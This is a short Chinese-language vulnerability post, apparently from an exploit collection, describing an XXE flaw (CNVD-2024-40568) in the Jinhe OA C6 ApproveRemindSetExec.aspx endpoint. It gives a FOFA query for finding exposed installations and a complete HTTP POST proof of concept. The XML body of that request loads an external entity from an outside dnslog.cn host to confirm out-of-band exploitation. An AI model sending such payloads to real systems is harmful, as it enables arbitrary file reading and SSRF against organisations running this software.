# 金和OA-C6系统接口ApproveRemindSetExec.aspx存在XXE漏洞(CNVD-2024-40568)

金和OA-C6系统接口ApproveRemindSetExec.aspx存在XXE漏洞，攻击者可利用xxe漏洞获取服务器敏感数据，可读取任意文件以及ssrf攻击，存在一定的安全隐患。

## fofa

```javascript
app="金和网络-金和OA"
```

## poc

```javascript
POST /c6/JHSoft.Web.AddMenu/ApproveRemindSetExec.aspx/? HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Type: application/xml

<!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://wwwwwwwwwwwwwwww.t07q8o.dnslog.cn"> %remote;]>
```

![image-20241029095818142](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202410290958202.png)